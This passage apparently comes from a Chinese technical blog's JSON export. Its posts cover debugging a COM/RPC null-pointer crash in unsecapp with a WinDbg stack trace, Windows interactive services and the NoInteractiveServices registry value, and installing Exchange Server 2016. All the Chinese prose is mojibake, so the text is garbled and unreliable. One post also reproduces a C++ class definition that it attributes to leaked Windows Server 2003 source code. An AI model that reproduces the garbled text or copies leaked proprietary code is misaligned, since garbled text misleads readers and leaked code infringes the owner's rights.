é€šçŸ¥è¿‡æ¥ä¹‹åï¼Œè°ƒç”¨äº†ç©ºæŒ‡é’ˆã€‚ ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§é—®é¢˜ï¼Œå¯ä»¥çœ‹ä¸‹ unsecapp çš„å †æ ˆï¼Œä¸Šè¾¹å·²ç»çœ‹åˆ°äº†å…·ä½“çš„pidå’Œtidï¼Œ1b34.1b48, è¿™å°±ç›´æ¥çœ‹çº¿ç¨‹ 1b38 çš„å †æ ˆå°±å¯ä»¥äº†ã€‚ å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 0 Id: 1b34.1b38 Suspend: 1 Teb: 7ffdf000 Unfrozen # ChildEBP RetAddr Args to Child 00 0018e8b0 773354ac 76d6a8b7 00000002 0018e904 ntdll!KiFastSystemCallRet (FPO: [0,0,0])01 0018e8b4 76d6a8b7 00000002 0018e904 00000001 ntdll!NtWaitForMultipleObjects+0xc (FPO: [5,0,0])02 0018e950 77420f8d 0018e904 0018e978 00000000 kernel32!WaitForMultipleObjectsEx+0x11d (FPO: [Non-Fpo])03 0018e9a4 76832507 0000002c 0018e9ec ffffffff USER32!RealMsgWaitForMultipleObjectsEx+0x13c (FPO: [Non-Fpo])04 0018e9cc 768325bc 0018e9ec ffffffff 0018e9fc ole32!CCliModalLoop::BlockFn+0x97 (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 1162] 05 0018e9f4 76938f62 ffffffff 002c27a0 0018eb00 ole32!ModalLoop+0x5b (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\chancont.cxx @ 211] 06 0018ea10 76939ce1 00000000 0018eb14 00000000 ole32!ThreadSendReceive+0x12c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 4831] 07 0018ea38 76939b4d 0018eb00 002cf4d8 0018eb5c ole32!CRpcChannelBuffer::SwitchAptAndDispatchCall+0x194 (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 4386] 08 0018eb18 76833f94 002cf4d8 0018ec40 0018ec24 ole32!CRpcChannelBuffer::SendReceive2+0xef (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 4009] 09 0018eb34 76833f46 0018ec40 0018ec24 002cf4d8 ole32!CCliModalLoop::SendReceive+0x1e (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 849] 0a 0018ebac 76853811 002cf4d8 0018ec40 0018ec24 ole32!CAptRpcChnl::SendReceive+0x73 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 578] 0b 0018ec00 7712074c 002cf4d8 0018ec40 0018ec24 ole32!CCtxComChnl::SendReceive+0x1c5 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\ctxchnl.cxx @ 734] 0c 0018ec18 771207ad 002a37bc 0018ecdc 771211b0 RPCRT4!NdrProxySendReceive+0x430d 0018ec24 771211b0 45542f97 0018f0d8 070001f3 RPCRT4!NdrpProxySendReceive+0xc (FPO: [0,0,0])0e 0018f09c 77120822 70b62ba8 70b621fc 0018f0d8 RPCRT4!NdrClientCall2+0x5e90f 0018f0c0 770aeb83 0018f0d8 00000004 0018f0f0 RPCRT4!ObjectStublessClient+0x6f10 0018f0d0 6fc1a87e 002a37bc 00000000 80041032 RPCRT4!ObjectStubless+0xf11 0018f0f0 004b2ec2 00eea0fc 00000000 80041032 fastprox!CSinkProxyBuffer::XSinkFacelet::SetStatus+0x2e (FPO: [Non-Fpo])12 0018f128 770b3419 00262914 00000000 80041032 unsecapp!CStub::SetStatus+0x7b (FPO: [Non-Fpo])13 0018f150 77121d35 004b2e47 0018f350 00000005 RPCRT4!Invoke+0x2a14 0018f180 771220a1 00000000 002aeb9c 002df118 RPCRT4!NdrStubCall2+0x28a (FPO: [SEH])15 0018f1c8 770b6e5f 76866918 70b62ba8 00000000 RPCRT4!NdrStubCall2+0x4ab (FPO: [SEH])16 0018f1cc 76866918 70b62ba8 00000000 00000000 RPCRT4!NdrpClientUnMarshal+0x464 (FPO: [SEH])17 0018f574 77122465 002d1e78 002cf658 002c31b8 ole32!NdrOleAllocate18 0018f5c4 6fc1a8b7 002d1e78 002c31b8 002cf658 RPCRT4!CStdStubBuffer_Invoke+0xa0 (FPO: [SEH])19 0018f5d8 7693a8c5 00eea174 002c31b8 002cf658 fastprox!CSinkStubBuffer::XSinkStublet::Invoke+0x36 (FPO: [Non-Fpo])1a 0018f620 7693aa59 002c31b8 002bd800 002b5eb0 ole32!SyncStubInvoke+0x3c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1161] 1b 0018f66c 768661d6 002c31b8 002cfd60 00eea174 ole32!StubInvoke+0xb9 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1372] 1c 0018f748 768660e7 002cf658 00000000 00eea174 ole32!CCtxComChnl::ContextInvoke+0xfa (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\ctxchnl.cxx @ 1255] 1d 0018f764 76866df5 002c31b8 00000001 00eea174 ole32!MTAInvoke+0x1a (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 2020] 1e 0018f790 7693a981 002c31b8 00000001 00eea174 ole32!STAInvoke+0x46 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 1839] 1f 0018f7c4 7693a79b d0908070 002cf658 00eea174 ole32!AppInvoke+0xaa (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1060] 20 0018f8a0 7693ae2d 002c3160 002abff0 00000400 ole32!ComInvokeWithLockAndIPID+0x32c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1675] 21 0018f8c8 76866bcd 002c3160 00000400 0029cc10 ole32!ComInvoke+0xc5 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1445] 22 0018f8dc 76866b8c 002c3160 0018f99c 00000400 ole32!ThreadDispatch+0x23 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\chancont.cxx @ 298] 23 0018f920 7741fd72 00c600f6 00000400 0000babe ole32!ThreadWndProc+0x167 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\chancont.cxx @ 654] 24 0018f94c 7741fe4a 76866aef 00c600f6 00000400 USER32!InternalCallWinProc+0x2325 0018f9c4 7742018d 00000000 76866aef 00c600f6 USER32!UserCallWinProcCheckWow+0x14b (FPO: [Non-Fpo])26 0018fa28 7742022b 76866aef 00000000 0018fa68 USER32!DispatchMessageWorker+0x322 (FPO: [Non-Fpo])27 0018fa38 004b4fd7 0018fa4c 71b6d20c 004b9118 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])28 0018fa68 004b6749 457c3509 004b954c 00000001 unsecapp!MessageLoop+0x28 (FPO: [Non-Fpo])29 0018fa98 004b41a2 00000002 00262228 002614a0 unsecapp!main+0x38c (FPO: [Non-Fpo])2a 0018fadc 76d6d411 7ffd7000 0018fb28 7731152f unsecapp!_initterm_e+0x163 (FPO: [Non-Fpo])2b 0018fae8 7731152f 7ffd7000 772f5944 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])2c 0018fb28 77311502 004b42dc 7ffd7000 ffffffff ntdll!__RtlUserThreadStart+0x23 (FPO: [Non-Fpo])2d 0018fb40 00000000 004b42dc 7ffd7000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) å¯ä»¥çœ‹åˆ°æ¶ˆæ¯éƒ½æ˜¯é€šè¿‡ DispatchMessageW å‘é€å‡ºå»çš„ã€‚åœ¨åç»­rpcé€šçŸ¥çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯å¯èƒ½å·²ç»è°ƒç”¨äº† CancelAsyncCallã€‚å½“rpcæ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°å´©æºƒé—®é¢˜ã€‚ 0x04 è§£å†³æ–¹æ³• åœ¨ CancelAsyncCall æ–¹æ³•ä¹‹åè®©å½“å‰çº¿ç¨‹é˜»å¡ä¸€ç‚¹æ—¶é—´ï¼Œç­‰å¾…ä¸Šæ¬¡ unsecapp rpcè°ƒç”¨ç»“æŸï¼Œå†è°ƒç”¨ release é‡Šæ”¾ IWbemServices ç­‰ç›¸å…³å¯¹è±¡ã€‚ è¡¥å…… reserverd1 å˜é‡è¯´æ˜: è¿˜æ˜¯è¿™ä¸ªé¡¹ç›® selfrender/Windows-Server-2003: This is the leaked source code of Windows Server 2003 å…ˆçœ‹ä¸€ä¸‹ CMessageCall ä½œä¸º CAsyncCall çš„çˆ¶ç±»æ˜¯æœ‰å“ªäº›æˆå‘˜çš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144//-----------------------------------------------------------------//// Class: CMessageCall//// Purpose: This class adds a message to the call info. The// proxie&#x27;s message is copied so the call can be// canceled without stray pointer references.////-----------------------------------------------------------------class CMessageCall : public ICancelMethodCalls, public IMessageParam&#123;public: // Constructor and destructor CMessageCall();protected: virtual ~CMessageCall(); virtual void UninitCallObject();public: // called before a call starts and after a call completes. virtual HRESULT InitCallObject(CALLCATEGORY callcat, RPCOLEMESSAGE *message, DWORD flags, REFIPID ipidServer, DWORD destctx, COMVERSION version, CChannelHandle *handle); // IUnknown methods STDMETHOD(QueryInterface)(REFIID riid, LPVOID *ppv) = 0; STDMETHOD_(ULONG,AddRef)(void) = 0; STDMETHOD_(ULONG,Release)(void) = 0; // ICancelMethodCalls methods STDMETHOD(Cancel)(ULONG ulSeconds) = 0; STDMETHOD(TestCancel)(void) = 0; // Virtual methods needed by every call type for cancel support virtual void CallCompleted ( HRESULT hrRet ) = 0; virtual void CallFinished () = 0; virtual HRESULT CanDispatch () = 0; virtual HRESULT WOWMsgArrived () = 0; virtual HRESULT GetState ( DWORD *pdwState ) = 0; virtual BOOL IsCallDispatched() = 0; virtual BOOL IsCallCompleted () = 0; virtual BOOL IsCallCanceled () = 0; virtual BOOL IsCancelIssued () = 0; virtual BOOL HasWOWMsgArrived() = 0; virtual BOOL IsClientWaiting () = 0; virtual void AckCancel () = 0; virtual HRESULT Cancel (BOOL fModalLoop, ULONG ulTimeout) = 0; virtual HRESULT AdvCancel () = 0; virtual void Abort() &#123; Win4Assert(!&quot;Abort Called&quot;); &#125; // Query methods BOOL ClientAsync() &#123; return _iFlags &amp; CALLFLAG_CLIENTASYNC; &#125; BOOL ServerAsync() &#123; return _iFlags &amp; CALLFLAG_SERVERASYNC; &#125; BOOL CancelEnabled() &#123; return _iFlags &amp; CALLFLAG_CANCELENABLED; &#125; BOOL IsClientSide() &#123; return !(_iFlags &amp; server_cs); &#125; BOOL FakeAsync() &#123; return _iFlags &amp; fake_async_cs; &#125; BOOL FreeThreaded() &#123; return _iFlags &amp; freethreaded_cs; &#125; void Lock() &#123; _iFlags |= locked_cs; &#125;#if DBG == 1 void SetNAToMTAFlag() &#123;_iFlags |= leave_natomta_cs;&#125; void ResetNAToMTAFlag()&#123;_iFlags &amp;= ~leave_natomta_cs;&#125; BOOL IsNAToMTAFlagSet()&#123; return _iFlags &amp; leave_natomta_cs;&#125; void SetNAToSTAFlag() &#123;_iFlags |= leave_natosta_cs;&#125; void ResetNAToSTAFlag()&#123;_iFlags &amp;= ~leave_natosta_cs;&#125; BOOL IsNAToSTAFlagSet()&#123; return _iFlags &amp; leave_natosta_cs;&#125;#endif BOOL Locked() &#123; return _iFlags &amp; locked_cs; &#125; BOOL Neutral() &#123; return _iFlags &amp; neutral_cs; &#125; BOOL ProcessLocal() &#123; return _iFlags &amp; process_local_cs; &#125; BOOL ThreadLocal() &#123; return _iFlags &amp; thread_local_cs; &#125; BOOL Proxy() &#123; return _iFlags &amp; proxy_cs; &#125; BOOL Server() &#123; return _iFlags &amp; server_cs; &#125; // Get methods DWORD GetTimeout(); DWORD GetDestCtx() &#123; return _destObj.GetDestCtx(); &#125; COMVERSION &amp;GetComVersion() &#123; return _destObj.GetComVersion(); &#125; CCtxCall *GetClientCtxCall() &#123; return m_pClientCtxCall; &#125; CCtxCall *GetServerCtxCall() &#123; return m_pServerCtxCall; &#125; BOOL GetErrorFromPolicy() &#123; return (_iFlags &amp; CALLFLAG_ERRORFROMPOLICY); &#125; HRESULT SetCallerhWnd(); HWND GetCallerhWnd() &#123; return _hWndCaller; &#125; HANDLE GetEvent() &#123; return _hEvent; &#125; CALLCATEGORY GetCallCategory()&#123; return _callcat; &#125; HRESULT GetResult() &#123; return _hResult; &#125; void SetResult(HRESULT hr) &#123; _hResult = hr; &#125; DWORD GetFault() &#123; return _server_fault; &#125; void SetFault(DWORD fault) &#123; _server_fault = fault; &#125; IPID &amp; GetIPID() &#123; return _ipid; &#125; HANDLE GetSxsActCtx() &#123; return _hSxsActCtx; &#125; // Set methods void SetThreadLocal(BOOL fThreadLocal); void SetClientCtxCall(CCtxCall *pCtxCall) &#123; m_pClientCtxCall = pCtxCall; &#125; void SetServerCtxCall(CCtxCall *pCtxCall) &#123; m_pServerCtxCall = pCtxCall; &#125; void SetClientAsync() &#123; _iFlags |= CALLFLAG_CLIENTASYNC; &#125; void SetServerAsync() &#123; _iFlags |= CALLFLAG_SERVERASYNC; &#125; void SetCancelEnabled() &#123; _iFlags |= CALLFLAG_CANCELENABLED; &#125; void SetErrorFromPolicy() &#123; _iFlags |= CALLFLAG_ERRORFROMPOLICY; &#125; void ResetErrorFromPolicy() &#123; _iFlags &amp;= ~CALLFLAG_ERRORFROMPOLICY; &#125; void SetSxsActCtx(HANDLE hCtx); // Other methods HRESULT RslvCancel(DWORD &amp;dwSignal, HRESULT hrIn, BOOL fPostMsg, CCliModalLoop *pCML); protected: // Call object fields CALLCATEGORY _callcat; // call category DWORD _iFlags; // EChannelState SCODE _hResult; // HRESULT or exception code HANDLE _hEvent; // caller wait event HWND _hWndCaller;// caller apartment hWnd (only used InWow) IPID _ipid; // ipid of interface call is being made on HANDLE _hSxsActCtx;// Activation context active in the caller&#x27;s contextpublic: // Channel fields DWORD _server_fault; CDestObject _destObj; void *_pHeader; CChannelHandle *_pHandle; handle_t _hRpc; // Call handle (not binding handle). IUnknown *_pContext; // Structure RPCOLEMESSAGE message; SChannelHookCallInfo hook; DWORD _dwErrorBufSize;protected: // Cancel fields ULONG m_ulCancelTimeout; // Seconds to wait before canceling the call DWORD m_dwStartCount; // Tick count at the time the call was made CCtxCall *m_pClientCtxCall; // Client side context call object CCtxCall *m_pServerCtxCall; // Server side context call object&#125;; 134è¡Œ message æˆå‘˜çš„ç»“æ„ä½“å°±æ˜¯æˆ‘ä»¬ç”¨æ¥è§£æ reserved1 æˆå‘˜æ—¶ä½¿ç”¨çš„ç»“æ„ä½“ã€‚ å¯ä»¥ä½¿ç”¨ RPCOLEMESSAGE çš„åŸå› å°±æ˜¯å› ä¸ºåœ¨ CAsyncCall çš„å¦å¤–ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œå½“ RPC æœåŠ¡ç«¯å“åº”æ—¶ï¼Œreserved1 è¢« _hRPC èµ‹å€¼äº†ã€‚è€Œ _hRpc åˆ™æ˜¯åœ¨rpcå»ºç«‹è¿æ¥æ—¶ç»‘å®šçš„ï¼ˆè°ƒç”¨å‡½æ•°ä¸º RpcBindingInqAuthInfoExW å‡½æ•° (rpcdce.h) - Win32 apps | Microsoft Learnï¼‰ã€‚ 123456789101112131415inline void CAsyncCall::ServerReply()&#123; Win4Assert( _hRpc != NULL ); if (_hResult != S_OK) &#123; I_RpcAsyncAbortCall( &amp;_AsyncState, _hResult ); &#125; else &#123; // Ignore errors because replies can fail. message.reserved1 = _hRpc; I_RpcSend( (RPC_MESSAGE *) &amp;message ); &#125;&#125;","tags":[{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"},{"name":"è°ƒè¯•","slug":"è°ƒè¯•","permalink":"https://hodlyounger.github.io/tags/%E8%B0%83%E8%AF%95/"},{"name":"COM","slug":"COM","permalink":"https://hodlyounger.github.io/tags/COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/COM/"}]},{"title":"ã€æœåŠ¡ã€‘äº¤äº’å¼æœåŠ¡","date":"2024-02-04T16:00:00.000Z","path":"A_OS/Windows/æœåŠ¡/ã€æœåŠ¡ã€‘äº¤äº’å¼æœåŠ¡/","text":"æ¦‚è¿°ï¼šäº¤äº’å¼æœåŠ¡æ˜¯ä»€ä¹ˆï¼Ÿ å‚è€ƒé“¾æ¥ï¼š äº¤äº’å¼æœåŠ¡æ£€æµ‹_ç™¾åº¦ç™¾ç§‘ äº¤äº’å¼æœåŠ¡ - Win32 apps | Microsoft Learn 0x01 è¯´æ˜ äº¤äº’å¼æœåŠ¡æ˜¯windowsçš„ä¸€ä¸ªæœåŠ¡ç¨‹åºã€‚ äº¤äº’å¼æœåŠ¡æ£€æµ‹æ˜¯[Microsoft Windows](https://baike.baidu.com/item/Microsoft Windows/0?fromModule=lemma_inlink)å¯¹Windows Vistaä»¥å‰çš„äº¤äº’å¼æœåŠ¡åœ¨Windows VistaåŠä»¥åçš„æ“ä½œç³»ç»Ÿä¸­æ— æ³•æ­£å¸¸å·¥ä½œçš„é—®é¢˜ï¼ˆSession 0éš”ç¦»ï¼‰ç»™å‡ºçš„åº”å¯¹æ–¹æ¡ˆã€‚ç„¶è€Œï¼Œæ­¤æ–¹æ¡ˆå¹¶ä¸èƒ½è¾ƒå¥½çš„è§£å†³é—®é¢˜ï¼ˆéœ€åˆ‡æ¢çª—å£ç«™ï¼‰ï¼Œæ•…ä¸å»ºè®®ä½¿ç”¨åœ¨Windows VistaåŠä»¥åçš„ç³»ç»Ÿä¸­ä½¿ç”¨äº¤äº’å¼æœåŠ¡ã€‚ æœåŠ¡æè¿°ï¼šå¯ç”¨äº¤äº’æœåŠ¡éœ€è¦ç”¨æˆ·è¾“å…¥æ—¶è¿›è¡Œç”¨æˆ·é€šçŸ¥ï¼Œè¿™æ ·ï¼Œä¾¿å¯ä»¥åœ¨äº¤äº’æœåŠ¡åˆ›å»ºçš„å¯¹è¯æ¡†å‡ºç°æ—¶è®¿é—®è¿™äº›å¯¹è¯æ¡†ã€‚å¦‚æœåœæ­¢æ­¤æœåŠ¡ï¼Œåˆ™å¯¹æ–°äº¤äº’æœåŠ¡å¯¹è¯æ¡†çš„é€šçŸ¥å°†æ— æ³•æ­£å¸¸è¿è¡Œï¼Œè€Œä¸”å¯èƒ½æ— æ³•è®¿é—®è¿™äº›äº¤äº’æœåŠ¡å¯¹è¯æ¡†ã€‚å¦‚æœå·²ç¦ç”¨æ­¤æœåŠ¡ï¼Œåˆ™ä¸å†æœ‰æ–°çš„äº¤äº’æœåŠ¡å¯¹è¯æ¡†é€šçŸ¥ï¼Œä¹Ÿæ— æ³•è®¿é—®è¿™äº›å¯¹è¯æ¡†ã€‚ .mbvdjdsfoysv{zoom:67%;} é€šä¿—ç®€å•çš„è¯´å°±æ˜¯ï¼ŒæœåŠ¡ä¸€èˆ¬éƒ½æ˜¯æ§åˆ¶å°åº”ç”¨ç¨‹åºï¼Œæœ‰æ—¶å€™å¯èƒ½éœ€è¦ä¸ç”¨æˆ·äº¤äº’ï¼Œç”±æ­¤è®¾è®¡äº†ä¸€ä¸ªä¸“é—¨ä¸ºåœ¨æ²¡æœ‰å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰çš„æƒ…å†µä¸‹å¯ä»¥å®ç°äº¤äº’çš„æœåŠ¡ã€‚è€Œè¿™ä¸ªæœåŠ¡å°±æ˜¯ UIDDetect ï¼Œä¹Ÿå³ Interactive Services Detectionã€‚ â—â—â— ä» Windows Vista èµ·ï¼ŒæœåŠ¡æ— æ³•ç›´æ¥ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚å› æ­¤ï¼Œä¸åº”åœ¨æ–°ä»£ç ä¸­ä½¿ç”¨æ ‡é¢˜ä¸ºâ€œä½¿ç”¨äº¤äº’æœåŠ¡â€ä¸€èŠ‚ä¸­æåˆ°çš„æŠ€æœ¯ã€‚ ä½¿ç”¨åŠæ³¨æ„äº‹é¡¹ å‚è€ƒå¾®è½¯å…³äºäº¤äº’å¼æœåŠ¡çš„æè¿°æ–‡ç« å³å¯ã€‚äº¤äº’å¼æœåŠ¡ - Win32 apps | Microsoft Learn å¦‚ä½•å…³é—­ ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹åŒ…å«ä¸€ä¸ªå€¼ NoInteractiveServicesï¼Œè¯¥å€¼æ§åˆ¶SERVICE_INTERACTIVE_PROCESSçš„æ•ˆæœï¼š HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Windows NoInteractiveServices å€¼é»˜è®¤ä¸º 1ï¼Œè¿™æ„å‘³ç€æ— è®ºæœåŠ¡æ˜¯å¦å…·æœ‰SERVICE_INTERACTIVE_PROCESSï¼Œéƒ½ä¸å…è®¸ä»¥äº¤äº’æ–¹å¼è¿è¡Œä»»ä½•æœåŠ¡ã€‚ å½“ NoInteractiveServices è®¾ç½®ä¸º 0 æ—¶ï¼Œå…è®¸å…·æœ‰ SERVICE_INTERACTIVE_PROCESS çš„æœåŠ¡ä»¥äº¤äº’æ–¹å¼è¿è¡Œã€‚","tags":[{"name":"Windows/æœåŠ¡","slug":"Windows-æœåŠ¡","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%9C%8D%E5%8A%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"ã€ç¯å¢ƒæ­å»ºã€‘Exchange Server 2016 CU21","date":"2024-02-02T05:49:50.778Z","path":"A_OS/Windows/ç¯å¢ƒæ­å»º/ã€ç¯å¢ƒæ­å»ºã€‘Exchange-2016/","text":"æ¦‚è¿°ï¼šExchange Server 2016 CU21å®‰è£…å’Œé…ç½®ï¼Œå®‰è£… Exchange éœ€è¦ç›®æ ‡æœåŠ¡å™¨å¿…é¡»æ˜¯ AD åŸŸçš„æˆå‘˜ã€‚ Windows Server 2016 å®‰è£…å’Œé…ç½®å‚è€ƒ ã€ç¯å¢ƒæ­å»ºã€‘åŸŸæœåŠ¡å™¨ ä¸‹è½½ MSDN, æˆ‘å‘Šè¯‰ä½  - åšä¸€ä¸ªå®‰é™çš„å·¥å…·ç«™ åœ¨MSDNä¸­ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬ å®‰è£…ä¸€ä¸‹ä¾èµ–çš„ç»„ä»¶ï¼šï¼ˆå‚è€ƒhttps://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2016ï¼‰ 1.NET Framework 4.8 https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe 2.å®‰è£…Visual C++ Redistributable Package for Visual Studio 2012 https://www.microsoft.com/en-us/download/details.aspx?id=30679 3.Visual C++ 2013 Redistributable Package https://support.microsoft.com/zh-cn/topic/update-for-visual-c-2013-redistributable-package-d8ccd6a5-4e26-c290-517b-8da6cfdf4f10 4.é€šè¿‡Power Shellå®‰è£…Exchangeå¿…å¤‡çš„Windowsç»„ä»¶ ç”±äºæˆ‘ä»¬å®‰è£…çš„ 2016 ç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ç›´æ¥ä½¿ç”¨æœ‰å®‰è£…å‘å¯¼çš„ Exchange é‚®ç®±æœåŠ¡å™¨ã€‚ å‚è€ƒ ä½¿ç”¨å®‰è£…å‘å¯¼å®‰è£… Exchange é‚®ç®±æœåŠ¡å™¨ | Microsoft Learn å…¶ä»–ç‰ˆæœ¬ä¸‹è½½é“¾æ¥ Exchange 2016 cu13 https://download.microsoft.com/download/5/9/6/59681DAE-AB62-4854-8DEC-CA25FFEFE3B3/ExchangeServer2016-x64-cu13.iso å®‰è£…å‡†å¤‡ åŠ¡å¿…å®‰è£…ä»¥ä¸‹å‡ ä¸ªæ¨¡å—ï¼š å®‰è£… .Net FrameWork 4.8 ä¸‹è½½é“¾æ¥ï¼šhttps://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe å®‰è£… KB3206632 ä¸‹è½½é“¾æ¥ï¼šMicrosoft Update Catalog å®‰è£… Unified Communications Managed API 4.0 Runtime ä¸‹è½½é“¾æ¥ï¼šDownload Unified Communications Managed API 4.0 Runtime from Official Microsoft Download Center å®‰è£… å¦‚æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå¯ä¸ä½¿ç”¨æ¨èè®¾ç½®ï¼Œå¦‚æ— ï¼Œåˆ™ä½¿ç”¨æ¨èè®¾ç½®æ›´æ–¹ä¾¿ã€‚ ä½¿ç”¨æ¨èè®¾ç½® ç›´æ¥å®‰è£…å³å¯ã€‚ä¸ä½¿ç”¨æ¨èè®¾ç½®æƒ…å†µä¸‹åŸºæœ¬ä¸æ¨èè®¾ç½®ä¸€è‡´ã€‚ æœåŠ¡å™¨è§’è‰²é€‰æ‹© å®‰è£…ç©ºé—´å’Œä½ç½®ï¼Œé»˜è®¤ Exchange ç»„ç»‡ï¼Œè¾“å…¥ç»„ç»‡åç§°ï¼Œå¯ä»¥å‹¾é€‰æŒ‰ç…§ ADæ‹†åˆ†æƒé™åº”ç”¨äº Exchange ç»„ç»‡ï¼ˆå¦‚æœæ˜¯åœ¨åŸŸæ§æœåŠ¡å™¨ä¸Šï¼Œåˆ™ä¸å¯ä»¥å‹¾é€‰ï¼‰ æ¶æ„è½¯ä»¶é˜²æŠ¤è®¾ç½®ï¼Œé€‰æ‹©æ˜¯å¦å‹¾é€‰ï¼Œå¦‚æœå‹¾é€‰ï¼Œéœ€è¦è”ç½‘ä¸‹è½½åæ¶æ„è½¯ä»¶å¼•æ“ã€‚ å‡†å¤‡æƒ…å†µæ£€æŸ¥ï¼Œç­‰å¾…æ£€æŸ¥å®Œæˆé€‰æ‹©å®‰è£…å³å¯ã€‚ å®‰è£…ç»“æŸ é…ç½® é»˜è®¤å®‰è£…å®Œæˆåä¼šæœ‰ä½“éªŒå¤©æ•° é‚®ç®±ç®¡ç†ç™»å½•é¡µé¢ï¼šhttps://localhost/ecp ä¸ªäººé‚®ç®±ç”¨æˆ·ç™»å½•é¡µé¢ï¼šhttps://localhost/owa å½“ç„¶å®‰è£…å®Œæˆåä¹Ÿæ”¯æŒPOP3ï¼ŒIMAPæœåŠ¡ è¯¦æƒ…åœ¨æœåŠ¡é‡Œé¢å¯åŠ¨å°±å¯ä»¥è¿›è¡Œé…ç½® é…ç½®è¯­è¨€å’Œæ—¶åŒº ç™»å½•ä¸ªäººé‚®ç®± é€‰æ‹©æ˜¯å¦å¼€å¯ IMAP4ã€POP3","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"exchange","slug":"exchange","permalink":"https://hodlyounger.github.io/tags/exchange/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç¯å¢ƒæ­å»º","slug":"A-OS/Windows/ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"ã€ç¯å¢ƒæ­å»ºã€‘windows Server 2016 ADåŸŸæ§æ­å»º","date":"2024-02-02T01:47:12.077Z","path":"A_OS/Windows/ç¯å¢ƒæ­å»º/ã€ç¯å¢ƒæ­å»ºã€‘åŸŸæœåŠ¡å™¨/","text":"æ¦‚è¿°ï¼šwindows server 2016 è™šæ‹Ÿæœºå®‰è£…åŠADåŸŸæ§æ­å»º å®‰è£…windows server 2016 